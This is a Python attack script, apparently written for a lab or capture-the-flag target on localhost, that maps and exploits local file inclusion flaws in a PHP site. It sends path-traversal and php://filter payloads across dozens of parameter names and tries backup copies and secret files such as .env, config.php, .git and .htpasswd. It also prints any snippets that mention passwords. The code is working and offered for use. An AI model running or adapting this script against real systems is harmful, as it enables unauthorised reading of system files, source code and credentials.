import requests
import re
import time
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import json

# Configuration
BASE_URL = "http://127.0.0.1:33209"
HEADERS = {"User-Agent": "Mozilla/5.0 (LFI-Recon)"}

# Color codes for output
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

# Common LFI test payloads
def get_lfi_payloads():
    return [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",  # Bypass some filters
        "..%2f..%2f..%2f..%2fetc%2fpasswd",  # URL encoded
        "/etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
    ]

# Common PHP files to test (from context - only post.php is mentioned)
def get_common_files():
    return ["post.php", "index.php"]  # Only post.php from context, index.php is safe default

# Extended parameter names for LFI
def get_parameter_names():
    return [
        # Standard LFI params
        "id", "page", "file", "path", "template", "include", "load", "view", "open",
        # Content-specific params (from requirements)
        "post", "article", "content", "doc", "document", "filename", "name",
        # Other common params
        "dir", "folder", "location", "resource", "src", "source",
        # Admin/debug params that might exist
        "debug", "test", "cfg", "config"
    ]

# Backup file extensions to test
def get_backup_extensions():
    return [
        ".bak", ".backup", ".old", ".orig", ".~", ".php~", ".swp", ".swo",
        ".tmp", ".copy", ".save"
    ]

# Configuration/secret files to look for
def get_secret_files():
    return [
        ".env", "config.php", "config.inc.php", "settings.php",
        ".git/config", ".git/HEAD", ".git/index",
        "backup.zip", "backup.tar.gz", "backup.sql",
        "phpinfo.php", "test.php", "debug.php", "admin.php",
        ".htaccess", ".htpasswd", "robots.txt", "README.md"
    ]

# Test a single URL with LFI payload
def test_lfi(url, param, payload, method="GET", timeout=5):
    try:
        if method == "GET":
            params = {param: payload}
            response = requests.get(url, params=params, headers=HEADERS, timeout=timeout)
        elif method == "POST":
            data = {param: payload}
            response = requests.post(url, data=data, headers=HEADERS, timeout=timeout)
        else:
            return None
        
        return response
    except Exception as e:
        return None

# Check if response contains LFI indicators
def analyze_lfi_response(response, payload):
    if response is None:
        return False, []
    
    indicators = []
    content = response.text.lower()
    
    # Linux/Unix system file indicators
    if any(indicator in content for indicator in [
        "root:", "bin:", "daemon:", "/bin/bash", "/bin/sh",
        "uid=", "gid=", "home=", "/etc/passwd",
        "mysql:", "www-data:", "nobody:"
    ]):
        indicators.append("linux_passwd")
    
    # PHP base64 encoded content (php://filter)
    if "PD9waHA" in response.text or "<?php" in response.text:
        indicators.append("php_source")
    
    # Common PHP errors that might reveal path
    if any(error in content for error in [
        "warning:", "failed to open stream", "no such file or directory",
        "include_path", "require_once", "include("
    ]):
        indicators.append("php_error")
    
    # File/path disclosures
    if "/var/www/" in content or "/home/" in content or "/usr/local/" in content:
        indicators.append("path_disclosure")
    
    return len(indicators) > 0, indicators

# Extract links from HTML/JS
def extract_links(html, base_url):
    links = set()
    
    # HTML links
    soup = BeautifulSoup(html, 'html.parser')
    
    # Standard links
    for tag in soup.find_all(['a', 'link', 'script', 'img']):
        for attr in ['href', 'src', 'action']:
            if tag.get(attr):
                full_url = urljoin(base_url, tag[attr])
                if urlparse(full_url).netloc == urlparse(base_url).netloc:
                    links.add(full_url)
    
    # Forms
    for form in soup.find_all('form'):
        action = form.get('action', '')
        method = form.get('method', 'GET').upper()
        form_url = urljoin(base_url, action)
        
        # Extract form parameters
        params = []
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            param_name = input_tag.get('name')
            if param_name:
                params.append({
                    'name': param_name,
                    'type': input_tag.get('type', 'text'),
                    'value': input_tag.get('value', '')
                })
        
        links.add(f"[FORM] {method} {form_url} - Params: {', '.join([p['name'] for p in params])}")
    
    # JavaScript links/endpoints
    js_patterns = [
        r'["\'](/?[\w/-]+\.php)["\']',
        r'["\'](/?[\w/-]+\.html?)["\']',
        r'["\'](/?api/[\w/-]+)["\']',
        r'fetch\(["\']([^"\']+)["\']',
        r'xmlhttprequest\(["\']([^"\']+)["\']',
        r'window\.location\.href\s*=\s*["\']([^"\']+)["\']',
        r'\.ajax\(\{[^}]*url\s*:\s*["\']([^"\']+)["\']'
    ]
    
    for pattern in js_patterns:
        matches = re.findall(pattern, html, re.I | re.S)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and not match.startswith('http'):
                full_url = urljoin(base_url, match)
                if urlparse(full_url).netloc == urlparse(base_url).netloc:
                    links.add(full_url)
    
    return list(links)

# Test backup/hidden files
def test_backup_files(base_url, filename):
    results = []
    original_url = f"{base_url}/{filename}"
    
    # Test original file
    try:
        resp = requests.get(original_url, headers=HEADERS, timeout=5)
        results.append({
            'url': original_url,
            'status': resp.status_code,
            'size': len(resp.content),
            'type': 'original'
        })
    except:
        results.append({'url': original_url, 'status': 'ERROR', 'type': 'original'})
    
    # Test backup extensions
    base_name = filename.replace('.php', '')
    for ext in get_backup_extensions():
        test_url = f"{base_url}/{base_name}{ext}"
        try:
            resp = requests.get(test_url, headers=HEADERS, timeout=5)
            if resp.status_code == 200:
                results.append({
                    'url': test_url,
                    'status': resp.status_code,
                    'size': len(resp.content),
                    'type': 'backup',
                    'content-snippet': resp.text[:200]
                })
        except:
            continue
    
    # Test dot-prefix hidden files
    hidden_files = [f".{filename}", f"_{filename}", f"{filename}.old"]
    for hidden in hidden_files:
        test_url = f"{base_url}/{hidden}"
        try:
            resp = requests.get(test_url, headers=HEADERS, timeout=5)
            if resp.status_code == 200:
                results.append({
                    'url': test_url,
                    'status': resp.status_code,
                    'size': len(resp.content),
                    'type': 'hidden'
                })
        except:
            continue
    
    return results

# Test posts/uploads directories
def test_uploads_directory(base_url):
    results = []
    
    # Common upload directory paths (from context - posts/ and uploads/ should exist)
    upload_dirs = [
        "/posts", "/uploads", "/upload", "/files", "/images",
        "/assets", "/media", "/content"
    ]
    
    for directory in upload_dirs:
        dir_url = f"{base_url}{directory}"
        try:
            # Try to list directory
            resp = requests.get(dir_url, headers=HEADERS, timeout=5)
            
            # Check for directory listing
            indicators = ["index of", "directory listing for", "<title>index of"]
            is_listing = any(ind in resp.text.lower() for ind in indicators)
            
            results.append({
                'directory': directory,
                'url': dir_url,
                'status': resp.status_code,
                'listing': is_listing,
                'size': len(resp.content)
            })
            
            # If listing is enabled, extract files
            if is_listing:
                files = re.findall(r'href=["\']?([^"\'\s>]+\.[^"\'\s>]{2,4})["\'\s>]', resp.text, re.I)
                results[-1]['files'] = list(set(files))[:10]  # Limit to first 10
                
        except Exception as e:
            results.append({
                'directory': directory,
                'error': str(e)
            })
    
    return results

# Main reconnaissance function
def run_lfi_recon():
    print(f"{Colors.BLUE}[*] Starting LFI Architecture Mapping{Colors.RESET}")
    print(f"{Colors.BLUE}[*] Target: {BASE_URL}{Colors.RESET}")
    print("="*80)
    
    findings = {
        'lfi_vulnerabilities': [],
        'backup_files': [],
        'uploads_access': [],
        'discovered_endpoints': [],
        'parameters_map': {},
        'secret_files': []
    }
    
    # Phase 1: Test common PHP files with LFI parameters
    print(f"\n{Colors.YELLOW}[Phase 1] Testing PHP files with LFI parameters...{Colors.RESET}")
    
    for php_file in get_common_files():
        file_url = f"{BASE_URL}/{php_file}"
        
        try:
            # First, test if the file exists
            base_resp = requests.get(file_url, headers=HEADERS, timeout=5)
            if base_resp.status_code != 200:
                print(f"  [-] {php_file} not found (status: {base_resp.status_code})")
                continue
            
            print(f"  [+] {php_file} exists (status: {base_resp.status_code}, size: {len(base_resp.content)}B)")
            
            # Extract links from the page
            links = extract_links(base_resp.text, BASE_URL)
            if links:
                findings['discovered_endpoints'].extend(links)
                print(f"    [+] Found {len([l for l in links if not l.startswith('[FORM]')])} links/forms")
            
            # Map parameters by testing each one
            findings['parameters_map'][php_file] = {
                'url': file_url,
                'parameters_tested': [],
                'vulnerable_params': []
            }
            
            # Test each parameter with LFI payloads
            for param in get_parameter_names():
                param_data = {
                    'name': param,
                    'methods_tested': [],
                    'vulnerable': False,
                    'indicators': []
                }
                
                for payload in get_lfi_payloads():
                    # Test GET method
                    resp_get = test_lfi(file_url, param, payload, "GET")
                    is_vuln_get, indicators_get = analyze_lfi_response(resp_get, payload)
                    
                    # Test POST method
                    resp_post = test_lfi(file_url, param, payload, "POST")
                    is_vuln_post, indicators_post = analyze_lfi_response(resp_post, payload)
                    
                    if is_vuln_get or is_vuln_post:
                        param_data['vulnerable'] = True
                        param_data['indicators'] = list(set(indicators_get + indicators_post))
                        
                        vuln_info = {
                            'file': php_file,
                            'parameter': param,
                            'payload': payload,
                            'method': "GET" if is_vuln_get else "POST",
                            'url': file_url,
                            'indicators': param_data['indicators']
                        }
                        findings['lfi_vulnerabilities'].append(vuln_info)
                        print(f"    {Colors.RED}[CRITICAL] LFI vulnerability found in {param}{Colors.RESET}")
                        print(f"             Payload: {payload}")
                        print(f"             Indicators: {', '.join(param_data['indicators'])}")
                        # Don't test more payloads once vulnerability confirmed
                        break
                
                param_data['methods_tested'] = ["GET", "POST"]
                findings['parameters_map'][php_file]['parameters_tested'].append(param_data)
                
                if param_data['vulnerable']:
                    findings['parameters_map'][php_file]['vulnerable_params'].append(param)
            
            print(f"    [+] Tested {len(get_parameter_names())} parameters, found {len(findings['parameters_map'][php_file]['vulnerable_params'])} vulnerable")
            
        except Exception as e:
            print(f"  [-] Error testing {php_file}: {str(e)}")
    
    # Phase 2: Test backup and hidden files
    print(f"\n{Colors.YELLOW}[Phase 2] Testing for backup and hidden files...{Colors.RESET}")
    
    for php_file in get_common_files():
        backup_results = test_backup_files(BASE_URL, php_file)
        findings['backup_files'].extend(backup_results)
        
        for result in backup_results:
            if result.get('type') in ['backup', 'hidden']:
                print(f"  {Colors.GREEN}[+] Found {result['type']} file: {result['url']}{Colors.RESET}")
                if result.get('content-snippet'):
                    print(f"      Content preview: {result['content-snippet'][:100]}...")
    
    # Phase 3: Test configuration/secret files
    print(f"\n{Colors.YELLOW}[Phase 3] Testing for configuration and secret files...{Colors.RESET}")
    
    for secret_file in get_secret_files():
        secret_url = f"{BASE_URL}/{secret_file}"
        try:
            resp = requests.get(secret_url, headers=HEADERS, timeout=5)
            if resp.status_code == 200:
                findings['secret_files'].append({
                    'url': secret_url,
                    'size': len(resp.content),
                    'snippet': resp.text[:200]
                })
                print(f"  {Colors.GREEN}[+] Exposed file: {secret_url} ({len(resp.content)}B){Colors.RESET}")
        except:
            continue
    
    # Phase 4: Test uploads/posts directories
    print(f"\n{Colors.YELLOW}[Phase 4] Testing uploads/posts directories...{Colors.RESET}")
    
    uploads_results = test_uploads_directory(BASE_URL)
    findings['uploads_access'] = uploads_results
    
    for result in uploads_results:
        if result.get('status') == 200:
            print(f"  [+] Directory {result['directory']}: status={result['status']}, listing={result.get('listing', False)}")
            if result.get('listing') and result.get('files'):
                print(f"      Files found: {', '.join(result['files'])}")
        elif result.get('error'):
            print(f"  [-] Directory {result['directory']}: Error - {result['error']}")
    
    # Phase 5: Parameter pollution testing
    print(f"\n{Colors.YELLOW}[Phase 5] Testing parameter pollution techniques...{Colors.RESET}")
    
    for php_file in get_common_files():
        file_url = f"{BASE_URL}/{php_file}"
        
        try:
            # Test multiple parameters simultaneously
            params_pollution = {}
            for i, param_name in enumerate(['id', 'page', 'file'][:3]):  # Use first 3 common params
                params_pollution[param_name] = get_lfi_payloads()[i % len(get_lfi_payloads())]
            
            resp = requests.get(file_url, params=params_pollution, headers=HEADERS, timeout=5)
            is_vuln, indicators = analyze_lfi_response(resp, "parameter_pollution")
            
            if is_vuln:
                print(f"  {Colors.RED}[+] Parameter pollution VULNERABLE: {php_file}{Colors.RESET}")
                print(f"      Indicators: {indicators}")
        except:
            continue
    
    # Summary
    print("\n" + "="*80)
    print(f"{Colors.BLUE}[*] RECONNAISSANCE COMPLETE{Colors.RESET}")
    print("="*80)
    
    print(f"\n{Colors.GREEN}SUMMARY:{Colors.RESET}")
    print(f"  LFI Vulnerabilities Found: {len(findings['lfi_vulnerabilities'])}")
    print(f"  Backup/Hidden Files Found: {len([f for f in findings['backup_files'] if f.get('type') in ['backup', 'hidden'] and f.get('status') == 200])}")
    print(f"  Secret Files Exposed: {len(findings['secret_files'])}")
    print(f"  Uploads Directories Accessible: {len([u for u in findings['uploads_access'] if u.get('status') == 200])}")
    print(f"  Total Endpoints Discovered: {len(findings['discovered_endpoints'])}")
    
    # Detailed findings
    if findings['lfi_vulnerabilities']:
        print(f"\n{Colors.RED}[+] LFI VULNERABILITIES DETAILS:{Colors.RESET}")
        for vuln in findings['lfi_vulnerabilities']:
            print(f"\n  File: {vuln['file']}")
            print(f"  Parameter: {vuln['parameter']}")
            print(f"  Method: {vuln['method']}")
            print(f"  Payload: {vuln['payload']}")
            print(f"  URL: {vuln['url']}?{vuln['parameter']}={vuln['payload']}")
            if vuln.get('indicators'):
                print(f"  Indicators: {', '.join(vuln['indicators'])}")
    
    if findings['secret_files']:
        print(f"\n{Colors.GREEN}[+] EXPOSED SECRET FILES:{Colors.RESET}")
        for secret in findings['secret_files']:
            print(f"\n  URL: {secret['url']}")
            print(f"  Size: {secret['size']}B")
            if 'database' in secret['snippet'].lower() or 'password' in secret['snippet'].lower():
                print(f"  Content: {secret['snippet']}")
    
    if findings['backup_files']:
        backup_count = len([f for f in findings['backup_files'] if f.get('status') == 200 and f.get('type') in ['backup', 'hidden']])
        print(f"\n{Colors.YELLOW}[+] BACKUP/HIDDEN FILES FOUND: {backup_count}{Colors.RESET}")
    
    # Save detailed findings to JSON
    with open('/tmp/lfi_recon_results.json', 'w') as f:
        json.dump(findings, f, indent=2, default=str)
    
    print(f"\n{Colors.BLUE}[*] Detailed results saved to /tmp/lfi_recon_results.json{Colors.RESET}")
    
    return findings

# Run the reconnaissance
if __name__ == "__main__":
    results = run_lfi_recon()
    print("\nReconnaissance script completed successfully.")
